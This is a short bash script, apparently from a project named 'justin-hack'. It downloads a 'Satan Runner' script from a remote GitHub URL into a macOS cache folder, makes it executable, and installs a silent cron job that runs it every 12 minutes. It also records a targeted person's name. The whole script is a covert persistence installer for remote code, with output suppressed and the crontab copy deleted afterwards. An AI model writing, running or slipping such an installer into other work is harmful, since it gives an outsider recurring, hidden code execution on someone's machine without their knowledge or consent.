#!/usr/bin/env bash

## Vars
jh=~/Library/Caches/jh
baseurl=https://raw.githubusercontent.com/FredericMartinez/justin-hack/master

## Prepare field
mkdir $jh 2> /dev/null

## Get Satan Runner
curl -o $jh/runner.sh $baseurl/runner.sh
chmod +x $jh/runner.sh

## Backup buddies
crontab -l > $jh/crontab

## Add Satan to buddies
echo "*/12 * * * * $jh/runner.sh > /dev/null 2>&1" >> $jh/crontab
crontab $jh/crontab

## Clean Satan
rm $jh/crontab

## Storage custom person
echo $1 > $jh/.person
